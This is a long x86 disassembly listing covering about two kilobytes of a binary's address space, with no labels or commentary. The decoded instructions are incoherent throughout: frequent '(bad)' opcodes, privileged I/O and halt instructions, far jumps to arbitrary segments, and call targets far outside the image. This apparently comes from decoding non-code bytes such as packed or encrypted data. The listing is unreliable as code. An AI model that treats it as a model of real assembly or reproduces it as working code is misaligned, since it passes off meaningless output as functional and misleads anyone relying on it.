  40b5cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5ce:	(bad)  
  40b5cf:	arpl   WORD PTR [eax+0x56813516],di
  40b5d5:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40b5d7:	ds pop eax
  40b5d9:	cmp    esi,DWORD PTR [ebp+0x2dc410bc]
  40b5df:	sbb    DWORD PTR [ebx+0x65],0xffffffd2
  40b5e3:	fcomp  DWORD PTR [edx-0x73]
  40b5e6:	mov    esi,0xa06c21fd
  40b5eb:	loop   0x40b5b8
  40b5ed:	xor    al,0x15
  40b5ef:	loop   0x40b59b
  40b5f1:	and    eax,0x7300f3f9
  40b5f6:	sub    bl,BYTE PTR [edi+ecx*1-0x790f83fd]
  40b5fd:	sub    esi,esi
  40b5ff:	dec    edx
  40b600:	jb     0x40b621
  40b602:	mov    BYTE PTR [edx+0x3ae18460],bh
  40b608:	inc    ebp
  40b609:	lock jmp 0x8d62:0xc31fbd12
  40b611:	pop    ecx
  40b612:	(bad)  
  40b613:	mov    edx,0x1c201982
  40b618:	xor    ah,bh
  40b61a:	mov    esp,0x42459863
  40b61f:	loop   0x40b601
  40b621:	ins    BYTE PTR es:[edi],dx
  40b622:	scas   al,BYTE PTR es:[edi]
  40b623:	in     eax,0x9a
  40b625:	add    al,0xe2
  40b627:	and    al,0xd7
  40b629:	mov    esp,gs
  40b62b:	and    bh,BYTE PTR [ecx+edi*1]
  40b62e:	lock imul ebx,ecx,0x25
  40b632:	push   0x6a388f56
  40b637:	and    ecx,0xffffffe6
  40b63a:	sbb    cl,BYTE PTR [esi+0x3b]
  40b63d:	es adc bh,dl
  40b640:	clc    
  40b641:	loop   0x40b6b7
  40b643:	dec    edx
  40b644:	cmp    al,0xdc
  40b646:	push   0x6c
  40b648:	mov    al,0x88
  40b64a:	hlt    
  40b64b:	cmp    dl,al
  40b64d:	shr    DWORD PTR [edx],cl
  40b64f:	repz mov edi,0x56fcbe0
  40b655:	out    0xed,eax
  40b657:	les    esi,FWORD PTR [edi+0x43da8bf8]
  40b65d:	mul    DWORD PTR [esi]
  40b65f:	push   eax
  40b660:	mov    ds:0xbd546d3d,eax
  40b665:	jmp    0x26d45e37
  40b66a:	aam    0x35
  40b66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b66d:	popa   
  40b66e:	sbb    DWORD PTR [ecx+0x73],esp
  40b671:	cmp    esp,DWORD PTR [ebp-0x620d181f]
  40b677:	aad    0x50
  40b679:	scas   al,BYTE PTR es:[edi]
  40b67a:	sub    BYTE PTR [edi-0x2e],dl
  40b67d:	push   ebp
  40b67e:	in     eax,0xa0
  40b680:	mov    ecx,0xe6066873
  40b685:	and    bl,BYTE PTR [edi]
  40b687:	mov    ebp,0xfe0546a9
  40b68c:	cmp    ebp,DWORD PTR [ecx]
  40b68e:	pop    ecx
  40b68f:	test   BYTE PTR [edx-0x6072a7a],bh
  40b695:	data16 sbb BYTE PTR [edx],al
  40b698:	fsub   DWORD PTR [ebx-0xad2035c]
  40b69e:	in     eax,0xbf
  40b6a0:	add    ebp,eax
  40b6a2:	xchg   bl,cl
  40b6a4:	lods   al,BYTE PTR ds:[esi]
  40b6a5:	or     al,0xf8
  40b6a7:	mov    dl,0x39
  40b6a9:	or     BYTE PTR [esi+0x22],bl
  40b6ac:	sub    eax,0x4790a9df
  40b6b1:	fcom   DWORD PTR [ebp+0x77]
  40b6b4:	jb     0x40b6a8
  40b6b6:	inc    ecx
  40b6b7:	pop    esi
  40b6b8:	xlat   BYTE PTR ds:[ebx]
  40b6b9:	push   eax
  40b6ba:	xchg   DWORD PTR [ebx],ebx
  40b6bc:	fisttp QWORD PTR ds:0x2ce2b72e
  40b6c2:	dec    eax
  40b6c3:	or     ebx,ebx
  40b6c5:	lods   eax,DWORD PTR ds:[esi]
  40b6c6:	jmp    0x322c:0xd14b51a8
  40b6cd:	inc    edi
  40b6ce:	pop    esi
  40b6cf:	test   dl,cl
  40b6d1:	pop    esi
  40b6d2:	inc    esp
  40b6d3:	cmp    cl,BYTE PTR [eax+0x7262b326]
  40b6d9:	or     DWORD PTR [eax],edx
  40b6db:	iret   
  40b6dc:	sub    al,0xa3
  40b6de:	dec    ecx
  40b6df:	es xor al,0x9f
  40b6e2:	popa   
  40b6e3:	sub    eax,eax
  40b6e5:	mov    ecx,0xbcd49ded
  40b6ea:	xchg   esi,eax
  40b6eb:	xchg   ecx,eax
  40b6ec:	fldenv [esi+0x178b020f]
  40b6f2:	mov    edi,0x86fc674c
  40b6f7:	ror    BYTE PTR [ebx+edx*1],cl
  40b6fa:	dec    edx
  40b6fb:	sbb    BYTE PTR [ecx],0xf3
  40b6fe:	mov    ecx,0x5fa7f4ea
  40b703:	aam    0xf3
  40b705:	mov    ds,WORD PTR [edi-0x3c]
  40b708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b709:	stos   BYTE PTR es:[edi],al
  40b70a:	rcr    DWORD PTR [edx+0x276f5c1a],cl
  40b710:	push   ss
  40b711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b712:	cmp    eax,0xef7f7ba5
  40b717:	or     DWORD PTR [ecx-0x51],esi
  40b71a:	call   0x9f1fd789
  40b71f:	jb     0x40b6bb
  40b721:	js     0x40b71f
  40b723:	lods   eax,DWORD PTR ds:[esi]
  40b724:	rcr    ecx,cl
  40b726:	mov    ebx,ebx
  40b728:	jg     0x40b77d
  40b72a:	xchg   ebp,eax
  40b72b:	das    
  40b72c:	loope  0x40b6d6
  40b72e:	fldcw  WORD PTR [ebp+0x71dd3c0a]
  40b734:	push   cs
  40b735:	scas   eax,DWORD PTR es:[edi]
  40b736:	push   ecx
  40b737:	add    ecx,0xffffffee
  40b73a:	jnp    0x40b6f1
  40b73c:	pusha  
  40b73d:	push   ds
  40b73e:	(bad)  [eax+0x3ecd0c92]
  40b744:	cwde   
  40b745:	ins    DWORD PTR es:[edi],dx
  40b746:	mov    bl,0xd6
  40b748:	mov    eax,esi
  40b74a:	aas    
  40b74b:	cmp    eax,0xf29f1e2
  40b750:	(bad)  
  40b752:	mov    BYTE PTR [edi+0x3e],ch
  40b755:	repz mov eax,ebx
  40b758:	pop    edi
  40b759:	pop    ebx
  40b75a:	jmp    0x40b7a8
  40b75c:	adc    al,BYTE PTR [edx]
  40b75e:	mov    edi,0xefa529c1
  40b763:	cmp    bl,BYTE PTR [ecx+0x1ff82a90]
  40b769:	pushf  
  40b76a:	mov    bh,0x14
  40b76c:	sbb    BYTE PTR [edx+0x479bf697],al
  40b772:	fidiv  WORD PTR [esi-0x10264148]
  40b778:	xor    DWORD PTR [esi-0x7b],edi
  40b77b:	dec    edi
  40b77c:	push   ss
  40b77d:	or     edx,DWORD PTR [edi+0x69ca1450]
  40b783:	out    0xc3,al
  40b785:	shl    DWORD PTR ds:0x66d49388,0xcf
  40b78c:	push   esi
  40b78d:	cdq    
  40b78e:	cmp    DWORD PTR [ebp+0x706e001d],edi
  40b794:	ret    
  40b795:	push   ebx
  40b796:	call   0x1ac082f2
  40b79b:	mov    dl,0x1e
  40b79d:	or     eax,0xdc6fb24e
  40b7a2:	push   ss
  40b7a3:	and    al,al
  40b7a5:	dec    edx
  40b7a6:	sahf   
  40b7a7:	dec    ecx
  40b7a8:	cwde   
  40b7a9:	xor    ch,BYTE PTR [edx]
  40b7ab:	jge    0x40b804
  40b7ad:	inc    edi
  40b7ae:	adc    DWORD PTR [esi],ebp
  40b7b0:	(bad)  
  40b7b1:	push   0x656f7595
  40b7b6:	pop    esp
  40b7b7:	pop    esi
  40b7b8:	test   ecx,0x80bdd284
  40b7be:	xchg   edx,esi
  40b7c0:	aaa    
  40b7c1:	mov    edi,0x310908ad
  40b7c6:	cli    
  40b7c7:	cmp    DWORD PTR [ecx-0x49b4355c],ebp
  40b7cd:	jmp    0x2df0:0x299c2f2e
  40b7d4:	cmp    al,0xed
  40b7d6:	inc    DWORD PTR [edx-0x1f]
  40b7d9:	sbb    eax,0x57cb1546
  40b7de:	dec    ebx
  40b7df:	and    al,0x26
  40b7e1:	sbb    al,0xf0
  40b7e3:	jge    0x40b850
  40b7e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7e6:	jno    0x40b7d3
  40b7e8:	xchg   esp,eax
  40b7e9:	mov    ds:0x551331b4,al
  40b7ee:	mov    bh,0xd1
  40b7f0:	jmp    0x4cc0:0x31577810
  40b7f7:	push   ss
  40b7f8:	es mov ebp,?
  40b7fb:	icebp  
  40b7fc:	aam    0xd7
  40b7fe:	inc    esi
  40b7ff:	jmp    0x148b:0x15d92cda
  40b806:	stc    
  40b807:	mov    eax,ds:0x952246e9
  40b80c:	push   0x171e2b96
  40b811:	xor    eax,0xd8ab501e
  40b816:	mov    ds:0xcf46730e,eax
  40b81b:	push   0x78
  40b81d:	aam    0xf5
  40b81f:	xchg   ebx,eax
  40b820:	jbe    0x40b858
  40b822:	gs xchg ch,bh
  40b825:	dec    ebx
  40b826:	cmc    
  40b827:	jbe    0x40b83a
  40b829:	retf   0xfa66
  40b82c:	mov    WORD PTR [eax+0x37],cs
  40b82f:	out    0xab,al
  40b831:	ins    BYTE PTR es:[edi],dx
  40b832:	xchg   esp,eax
  40b833:	inc    ecx
  40b834:	hlt    
  40b835:	sub    edx,ebx
  40b837:	nop
  40b838:	lods   al,BYTE PTR ds:[esi]
  40b839:	mov    esi,0x2f535a54
  40b83e:	pusha  
  40b83f:	jle    0x40b801
  40b841:	std    
  40b842:	nop
  40b843:	inc    ecx
  40b844:	ds sahf 
  40b846:	mov    cl,0x63
  40b848:	int3   
  40b849:	push   es
  40b84a:	mul    BYTE PTR [edi]
  40b84c:	jmp    0x40b878
  40b84e:	or     DWORD PTR [edi-0x6a9a6302],edx
  40b854:	(bad)  
  40b855:	cmc    
  40b856:	or     eax,0x837ba135
  40b85b:	push   ss
  40b85c:	jo     0x40b8b0
  40b85e:	push   ds
  40b85f:	repnz loopne 0x40b892
  40b862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b863:	pusha  
  40b864:	adc    BYTE PTR [edx+0x4aeeb7],cl
  40b86a:	add    al,0x48
  40b86c:	mov    ds:0x15bd4b5b,al
  40b871:	xchg   dx,ax
  40b873:	or     dh,BYTE PTR ds:0xbde7c089
  40b879:	and    DWORD PTR [edx+0x37],0x5605e2a6
  40b880:	nop
  40b881:	das    
  40b882:	in     al,dx
  40b883:	stos   BYTE PTR es:[edi],al
  40b884:	aad    0xb1
  40b886:	xor    DWORD PTR [ebx],ecx
  40b888:	loop   0x40b8b8
  40b88a:	pop    edi
  40b88b:	popa   
  40b88c:	pop    ds
  40b88d:	jle    0x40b811
  40b88f:	bound  edi,QWORD PTR [ebx-0x7fee02b6]
  40b895:	repz jns 0x40b914
  40b898:	push   cs
  40b899:	cwde   
  40b89a:	xchg   edx,eax
  40b89b:	fst    DWORD PTR [eax]
  40b89d:	xchg   BYTE PTR [eax],bl
  40b89f:	or     DWORD PTR [eax],0x288cc5a
  40b8a5:	clc    
  40b8a6:	adc    edi,eax
  40b8a8:	pop    ebx
  40b8a9:	(bad)  
  40b8ab:	cli    
  40b8ac:	pop    eax
  40b8ad:	mov    al,ds:0xac46cafd
  40b8b2:	or     ch,BYTE PTR [eax]
  40b8b4:	cmc    
  40b8b5:	or     eax,0x7acce326
  40b8ba:	cmp    DWORD PTR [edx],ebx
  40b8bc:	popf   
  40b8bd:	repz or DWORD PTR [eax],ecx
  40b8c0:	int3   
  40b8c1:	pop    ecx
  40b8c2:	and    eax,0x592f152d
  40b8c7:	xor    eax,0xff14de2d
  40b8cc:	int    0xc5
  40b8ce:	sbb    ecx,DWORD PTR [edx-0x2f50916e]
  40b8d4:	mov    ds:0x774be112,eax
  40b8d9:	rcl    DWORD PTR [edi-0x75d8519a],1
  40b8df:	nop
  40b8e0:	jl     0x40b89f
  40b8e2:	adc    DWORD PTR [eax-0x2d],esp
  40b8e5:	cmp    esp,DWORD PTR [eax]
  40b8e7:	jns    0x40b883
  40b8e9:	popf   
  40b8ea:	sysenter 
  40b8ec:	clc    
  40b8ed:	in     eax,dx
  40b8ee:	out    0x74,al
  40b8f0:	lock arpl WORD PTR [edx-0x226329d9],di
  40b8f7:	mov    ebp,0xe74ce5a8
  40b8fc:	mov    ds:0x7b3ca4c0,al
  40b901:	fild   DWORD PTR [edi+esi*4+0x3f]
  40b905:	ret    
  40b906:	or     edx,DWORD PTR [edi+edx*1-0x52aa46a5]
  40b90d:	mov    WORD PTR [ecx-0x2bdc7c81],es
  40b913:	cs pushf 
  40b915:	rcl    BYTE PTR [edi+ebx*1-0x2c],cl
  40b919:	xlat   BYTE PTR ds:[ebx]
  40b91a:	inc    eax
  40b91b:	rol    BYTE PTR [esi-0x37d0ac52],1
  40b921:	(bad)  
  40b922:	retf   
  40b923:	and    dl,bh
  40b925:	popa   
  40b926:	lds    esi,FWORD PTR [esi+0x47]
  40b929:	popa   
  40b92a:	test   BYTE PTR [ebp+esi*4-0x5b0331c2],ch
  40b931:	ins    BYTE PTR es:[edi],dx
  40b932:	scas   eax,DWORD PTR es:[edi]
  40b933:	xchg   DWORD PTR [ebp+0x2399f168],esp
  40b939:	(bad)  
  40b93b:	xor    esi,ecx
  40b93d:	mov    gs,eax
  40b93f:	cld    
  40b940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b941:	arpl   WORD PTR [ebx-0x2c],bx
  40b944:	jmp    0x40b938
  40b946:	mov    ebx,DWORD PTR [ecx]
  40b948:	stos   DWORD PTR es:[edi],eax
  40b949:	lods   al,BYTE PTR ds:[esi]
  40b94a:	repnz push ecx
  40b94c:	aam    0xbf
  40b94e:	pop    esi
  40b94f:	pop    ss
  40b950:	cs faddp st(6),st
  40b953:	cli    
  40b954:	lods   eax,DWORD PTR ds:[esi]
  40b955:	adc    al,0x43
  40b957:	pop    ebp
  40b958:	cld    
  40b959:	pop    ds
  40b95a:	sub    BYTE PTR [ebx-0x42],bh
  40b95d:	xchg   ecx,eax
  40b95e:	mov    BYTE PTR [edx],dl
  40b960:	mov    cl,al
  40b962:	lock in eax,0xce
  40b965:	test   BYTE PTR [eax+0x8],bl
  40b968:	xor    BYTE PTR [edx],0x86
  40b96b:	mov    esp,0x3f91226b
  40b970:	pop    eax
  40b971:	ja     0x40b91d
  40b973:	cmp    al,0x2b
  40b975:	jbe    0x40b953
  40b977:	scas   al,BYTE PTR es:[edi]
  40b978:	iret   
  40b979:	mov    bh,ah
  40b97b:	sub    eax,DWORD PTR [ecx]
  40b97d:	out    0x84,eax
  40b97f:	and    esp,edi
  40b981:	push   ebx
  40b982:	add    ecx,DWORD PTR [eax+0x56]
  40b985:	fs (bad) 
  40b987:	loope  0x40b935
  40b989:	aad    0x32
  40b98b:	inc    eax
  40b98c:	mov    dh,BYTE PTR [edi+0x55]
  40b98f:	out    0xf6,al
  40b991:	cmp    al,0xb7
  40b993:	push   ds
  40b994:	shl    BYTE PTR [eax+edx*4-0x30c41f72],cl
  40b99b:	scas   al,BYTE PTR es:[edi]
  40b99c:	call   0xdde3296
  40b9a1:	and    BYTE PTR [eax+eax*4],ch
  40b9a4:	(bad)  
  40b9a6:	push   cs
  40b9a7:	(bad)  
  40b9a8:	sahf   
  40b9a9:	xchg   esp,eax
  40b9aa:	jbe    0x40b92f
  40b9ac:	loope  0x40b93e
  40b9ae:	and    dl,BYTE PTR [eax-0x20]
  40b9b1:	fdivr  st,st(5)
  40b9b3:	dec    esp
  40b9b4:	stc    
  40b9b5:	leave  
  40b9b6:	retf   0xfced
  40b9b9:	and    eax,0x34a4ce0d
  40b9be:	cmp    eax,0x4294bf7b
  40b9c3:	jb     0x40b961
  40b9c5:	neg    BYTE PTR ds:0x2dd7af43
  40b9cb:	jecxz  0x40b991
  40b9cd:	jae    0x40b9a1
  40b9cf:	pop    es
  40b9d0:	dec    esp
  40b9d1:	test   cl,cl
  40b9d3:	cmp    esp,0x39
  40b9d6:	xchg   ebp,eax
  40b9d7:	adc    ecx,DWORD PTR [ebp+0x5a]
  40b9da:	xchg   bl,ch
  40b9dc:	dec    ebx
  40b9dd:	dec    eax
  40b9de:	mov    esi,0x81bbddf9
  40b9e3:	fdivr  QWORD PTR [ecx]
  40b9e5:	xor    BYTE PTR ds:0x78736ef4,cl
  40b9eb:	retf   
  40b9ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ed:	out    dx,eax
  40b9ee:	add    BYTE PTR [esi],al
  40b9f0:	pop    es
  40b9f1:	mov    eax,ds:0x8cada1b8
  40b9f6:	outs   dx,DWORD PTR ds:[esi]
  40b9f7:	mov    eax,cs:0x4c12a402
  40b9fd:	int    0xd6
  40b9ff:	mov    ebx,0x28a1465d
  40ba04:	sub    DWORD PTR [ebx-0x364b860a],eax
  40ba0a:	in     al,dx
  40ba0b:	repz jecxz 0x40b9f5
  40ba0e:	cmp    cl,bl
  40ba10:	push   ecx
  40ba11:	push   es
  40ba12:	push   0x1b337bb6
  40ba17:	int3   
  40ba18:	jnp    0x40b9ee
  40ba1a:	popf   
  40ba1b:	xor    BYTE PTR [ebp+ebx*2+0xbc530d5],bl
  40ba22:	imul   BYTE PTR [eax]
  40ba24:	xchg   ebx,eax
  40ba25:	hlt    
  40ba26:	ins    DWORD PTR es:[edi],dx
  40ba27:	dec    esp
  40ba28:	pushf  
  40ba29:	ins    DWORD PTR es:[edi],dx
  40ba2a:	imul   edx,ecx,0x7b
  40ba2d:	test   al,0x15
  40ba2f:	(bad)  
  40ba30:	push   edx
  40ba31:	inc    esi
  40ba32:	push   ebx
  40ba33:	mov    dh,bl
  40ba35:	add    edi,esp
  40ba37:	mov    esi,0xc38d0264
  40ba3c:	imul   ebp,edx,0xc94ca519
  40ba42:	pushf  
  40ba43:	in     al,0x96
  40ba45:	jae    0x40ba83
  40ba47:	retf   0x375b
  40ba4a:	rcr    DWORD PTR [ecx],cl
  40ba4c:	repnz push edi
  40ba4e:	daa    
  40ba4f:	push   eax
  40ba50:	xor    al,0xab
  40ba52:	ficom  DWORD PTR [edx]
  40ba55:	repnz push ds
  40ba57:	and    DWORD PTR [ecx+0x60],ebp
  40ba5a:	pop    esi
  40ba5b:	mov    ah,0x4c
  40ba5d:	mov    esi,0xbfc60f7b
  40ba62:	xchg   esi,eax
  40ba63:	cmp    eax,0x9cdfd52
  40ba68:	stos   DWORD PTR es:[edi],eax
  40ba69:	std    
  40ba6a:	loop   0x40bae8
  40ba6c:	sbb    esi,esi
  40ba6e:	jmp    0x6f6b0f7a
  40ba73:	push   ebx
  40ba74:	js     0x40ba5e
  40ba76:	sbb    DWORD PTR [edx-0x55],ecx
  40ba79:	sbb    edi,ebx
  40ba7b:	push   cs
  40ba7c:	into   
  40ba7d:	cmp    DWORD PTR [ebx],edi
  40ba7f:	push   ebp
  40ba80:	call   0x16153c6f
  40ba85:	(bad)  
  40ba87:	out    dx,eax
  40ba88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba89:	push   0x63
  40ba8b:	pushf  
  40ba8c:	xchg   ebx,eax
  40ba8d:	fisubr WORD PTR [ebp+0x303dce81]
  40ba93:	mov    dh,BYTE PTR ds:0xd8072825
  40ba99:	mov    edi,0x7565fb23
  40ba9e:	(bad)  
  40ba9f:	(bad)  
  40baa0:	adc    DWORD PTR [ecx-0x15],eax
  40baa3:	(bad)  
  40baa4:	fsub   st,st(0)
  40baa6:	out    dx,eax
  40baa7:	pop    ss
  40baa8:	xchg   edi,eax
  40baa9:	push   ds
  40baaa:	jns    0x40babd
  40baac:	xor    BYTE PTR [ebp+0x9],cl
  40baaf:	mov    ah,0x46
  40bab1:	cli    
  40bab2:	lds    ecx,FWORD PTR [edi-0x640dc956]
  40bab8:	jns    0x40ba93
  40baba:	ja     0x40bafc
  40babc:	mov    al,0xab
  40babe:	int3   
  40babf:	add    eax,edi
  40bac1:	cwde   
  40bac2:	and    al,0x68
  40bac4:	ins    DWORD PTR es:[edi],dx
  40bac5:	sbb    al,BYTE PTR [esi]
  40bac7:	mov    edi,0x9f65ee40
  40bacc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bacd:	in     eax,dx
  40bace:	mov    cl,0xeb
  40bad0:	fcomi  st,st(5)
  40bad2:	shl    DWORD PTR [esi-0x149c6df6],0x19
  40bad9:	sub    eax,0x6702060a
  40bade:	pop    ecx
  40badf:	fadd   DWORD PTR [ebx-0x1832b3b8]
  40bae5:	sub    eax,0x7625c8bc
  40baea:	push   0x399d7f22
  40baef:	mov    edi,0x2d14d3c4
  40baf4:	test   BYTE PTR [ecx],ch
  40baf6:	mov    dh,0x1c
  40baf8:	mov    ds:0x7a262b37,al
  40bafd:	add    dh,BYTE PTR [eax+0x335d39c6]
  40bb03:	outs   dx,BYTE PTR ds:[esi]
  40bb04:	push   ds
  40bb05:	dec    eax
  40bb06:	ss je  0x40bb7c
  40bb09:	jae    0x40bb40
  40bb0b:	cld    
  40bb0c:	enter  0x8b90,0x4a
  40bb10:	(bad)  
  40bb11:	jecxz  0x40bb69
  40bb13:	inc    ecx
  40bb14:	gs (bad) 
  40bb16:	call   0x597b:0xa77309db
  40bb1d:	push   edx
  40bb1e:	unpcklps xmm2,XMMWORD PTR [edi-0x418aab0]
  40bb25:	in     al,dx
  40bb26:	mov    ah,0x51
  40bb28:	xchg   ebp,eax
  40bb29:	out    0xb6,eax
  40bb2b:	popf   
  40bb2c:	or     DWORD PTR [edx+0x44],0xaffd863d
  40bb33:	(bad)  [ecx+0x76]
  40bb36:	int    0xdf
  40bb38:	fstp   TBYTE PTR [edi]
  40bb3a:	test   eax,0xe0b107da
  40bb3f:	or     ah,ah
  40bb41:	inc    edx
  40bb42:	sub    DWORD PTR ds:0x840b5e4,edx
  40bb48:	pop    esp
  40bb49:	int    0x83
  40bb4b:	pop    es
  40bb4c:	adc    eax,0x5ec26a2b
  40bb51:	es sbb eax,0xc6c8d2ef
  40bb57:	mov    dl,0xca
  40bb59:	je     0x40bbd4
  40bb5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb5c:	pusha  
  40bb5d:	test   DWORD PTR ds:0x5389fd7,ebx
  40bb63:	xchg   esi,eax
  40bb64:	lea    ecx,[ebp-0x2310ccf9]
  40bb6a:	add    bh,dl
  40bb6c:	rcr    DWORD PTR fs:0x16f6d4cb,0x55
  40bb74:	and    al,BYTE PTR [ebx]
  40bb76:	or     al,0xe2
  40bb78:	push   esp
  40bb79:	jl     0x40bb1d
  40bb7b:	push   ebp
  40bb7c:	cmp    al,0x2e
  40bb7e:	push   edi
  40bb7f:	mov    WORD PTR [edx],?
  40bb81:	inc    eax
  40bb82:	inc    ebp
  40bb83:	inc    edi
  40bb84:	test   eax,0x40bf35da
  40bb89:	nop
  40bb8a:	(bad)  
  40bb8b:	adc    eax,0x6c46b075
  40bb90:	fsubr  DWORD PTR [esi-0x74d2ec77]
  40bb96:	neg    BYTE PTR [esi-0x68]
  40bb99:	(bad)  
  40bb9a:	mov    cl,0x71
  40bb9c:	jmp    0xcb2:0x904c9fa4
  40bba3:	(bad)  
  40bba5:	adc    DWORD PTR [edi],esp
  40bba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bba8:	xor    al,0x17
  40bbaa:	xor    al,0x88
  40bbac:	adc    DWORD PTR [eax+0x5133c266],edx
  40bbb2:	mov    ecx,gs
  40bbb4:	in     eax,0xa3
  40bbb6:	cmp    ch,BYTE PTR [esi+esi*1]
  40bbb9:	ja     0x40bb79
  40bbbb:	sar    DWORD PTR [ebp-0x465c824d],cl
  40bbc1:	(bad)  
  40bbc2:	daa    
  40bbc3:	dec    BYTE PTR [ebx]
  40bbc5:	fnstcw WORD PTR [edi+ecx*2]
  40bbc8:	adc    al,0x67
  40bbca:	mov    ecx,0xfc9e9d64
  40bbcf:	jecxz  0x40bbdc
  40bbd1:	and    edi,DWORD PTR [ebx]
  40bbd3:	fs push 0x35937acf
  40bbd9:	jp     0x40bbbe
  40bbdb:	add    BYTE PTR [ebp+0xc],bh
  40bbde:	fisub  DWORD PTR [ecx+0x764ab6a5]
  40bbe4:	outs   dx,BYTE PTR ds:[esi]
  40bbe5:	push   ds
  40bbe6:	push   eax
  40bbe7:	ds push ebp
  40bbe9:	lock test eax,0xc0c2a377
  40bbef:	lea    edi,[ebp+0x6179f621]
  40bbf5:	push   cs
  40bbf6:	in     eax,dx
  40bbf7:	enter  0x23da,0xda
  40bbfb:	cmovnp esp,DWORD PTR [ebx-0x46]
  40bbff:	mov    ah,0x22
  40bc01:	test   DWORD PTR [ecx],esp
  40bc03:	jns    0x40bba0
  40bc05:	mov    WORD PTR [ebp-0x16],ss
  40bc08:	dec    ebx
  40bc09:	bnd ret 
  40bc0b:	or     DWORD PTR [edi+0x6444b4a0],ecx
  40bc11:	mov    ds:0xebca2263,al
  40bc16:	and    al,0x3f
  40bc18:	push   cs
  40bc19:	add    eax,0x53a831b
  40bc1e:	test   eax,0x61ca8c8e
  40bc23:	(bad)  
  40bc24:	loopne 0x40bc44
  40bc26:	pop    ebx
  40bc27:	jae    0x40bc26
  40bc29:	jecxz  0x40bbd3
  40bc2b:	pushf  
  40bc2c:	fmul   QWORD PTR [ebx+0x4b32c8c3]
  40bc33:	push   0x12f7dff7
  40bc38:	call   0x81601e91
  40bc3d:	stc    
  40bc3e:	lock mov esi,0xf8e55275
  40bc44:	inc    ebp
  40bc45:	inc    edx
  40bc46:	addr16 loopne 0x40bc95
  40bc49:	out    dx,al
  40bc4a:	shl    BYTE PTR [eax+eiz*8+0x63],0x2e
  40bc4f:	inc    ecx
  40bc50:	(bad)  
  40bc52:	adc    al,0x58
  40bc54:	gs jle 0x40bc57
  40bc57:	(bad)  
  40bc58:	cmc    
  40bc59:	cmc    
  40bc5a:	loopne 0x40bcd3
  40bc5c:	mov    eax,0xfb7c18e7
  40bc61:	jmp    0x1d73:0x12dfa6e9
  40bc68:	inc    ebp
  40bc69:	jp     0x40bcba
  40bc6b:	test   al,0x5
  40bc6d:	clc    
  40bc6e:	mov    eax,0xfd01d2b8
  40bc73:	or     eax,0xcf9a9186
  40bc78:	mov    edi,0x21bca2bd
  40bc7d:	fnstcw WORD PTR [eax+0x4d23a560]
  40bc83:	retf   0xa48f
  40bc86:	test   esi,eax
  40bc88:	add    DWORD PTR [edx],edx
  40bc8a:	adc    al,0x29
  40bc8c:	leave  
  40bc8d:	aas    
  40bc8e:	sar    ebx,1
  40bc90:	sub    ah,dh
  40bc92:	js     0x40bca2
  40bc94:	or     al,0x38
  40bc96:	jae    0x40bc24
  40bc98:	and    ecx,DWORD PTR [ebx]
  40bc9a:	fldlg2 
  40bc9c:	xor    DWORD PTR [ebx+0x79383579],0x7226a738
  40bca6:	mov    dh,0xbb
  40bca8:	hlt    
  40bca9:	xor    edi,eax
  40bcab:	push   ebp
  40bcac:	out    0x41,al
  40bcae:	dec    ebx
  40bcaf:	add    bh,BYTE PTR [eax-0x7c]
  40bcb2:	jmp    0x18d709bb
  40bcb7:	sar    dl,cl
  40bcb9:	add    al,0x7c
  40bcbb:	push   0x31bb7305
  40bcc0:	mov    ebx,0x9069bfed
  40bcc5:	jmp    0x40bcba
  40bcc7:	dec    esp
  40bcc8:	std    
  40bcc9:	pusha  
  40bcca:	aas    
  40bccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bccc:	pushf  
  40bccd:	je     0x40bce0
  40bccf:	pop    esi
  40bcd0:	das    
  40bcd1:	addr16 mov ah,0x2b
  40bcd4:	sbb    DWORD PTR [edx],edi
  40bcd6:	push   0xffffff8d
  40bcd8:	sbb    eax,0xa47f8c31
  40bcdd:	pop    ebx
  40bcde:	enter  0xe4ab,0xb1
  40bce2:	ret    
  40bce3:	fs sub al,0x8c
  40bce6:	pop    edx
  40bce7:	inc    esi
  40bce8:	rcl    BYTE PTR [esi],0x19
  40bceb:	cmp    esi,DWORD PTR [ebx]
  40bced:	adc    DWORD PTR [ebx-0x72b0a4bb],eax
  40bcf3:	and    eax,edx
  40bcf5:	mov    dl,0x83
  40bcf7:	sbb    DWORD PTR [esi-0x12e216ec],ecx
  40bcfd:	adc    ch,BYTE PTR [ecx+0x6d4b1c8b]
  40bd03:	enter  0x2d1d,0x45
  40bd07:	pop    ss
  40bd08:	sbb    al,0x78
  40bd0a:	mov    bl,0x5
  40bd0c:	lods   eax,DWORD PTR ds:[esi]
  40bd0d:	pop    eax
  40bd0e:	mov    esi,0x70db539a
  40bd13:	lea    ebx,[eax+edx*8]
  40bd16:	mov    cl,0x59
  40bd18:	and    ch,BYTE PTR [eax-0x7d4c7987]
  40bd1e:	cmp    ah,ch
  40bd20:	and    BYTE PTR [edi+esi*2],0xa7
  40bd24:	jmp    FWORD PTR [eax+0xadd5ecf]
  40bd2a:	out    0x1c,eax
  40bd2c:	sbb    dl,BYTE PTR [ebx+eiz*2+0x1f558590]
  40bd33:	enter  0x3166,0x7a
  40bd37:	mov    ch,0x3c
  40bd39:	imul   ebp,DWORD PTR [edx+0x324a6c09],0xe250f548
  40bd43:	cmc    
  40bd44:	mov    edi,0x3af8dc23
  40bd49:	push   ebp
  40bd4a:	cmp    DWORD PTR [eax],0xffffffc3
  40bd4d:	adc    al,0x81
  40bd4f:	stc    
  40bd50:	inc    esi
  40bd51:	fcmovb st,st(5)
  40bd53:	inc    ebx
  40bd54:	inc    ebx
  40bd55:	dec    eax
  40bd56:	(bad)  
  40bd57:	call   DWORD PTR [ebx]
  40bd59:	push   esi
  40bd5a:	icebp  
  40bd5b:	ja     0x40bd12
  40bd5d:	test   DWORD PTR [edx],eax
  40bd5f:	sbb    esi,esp
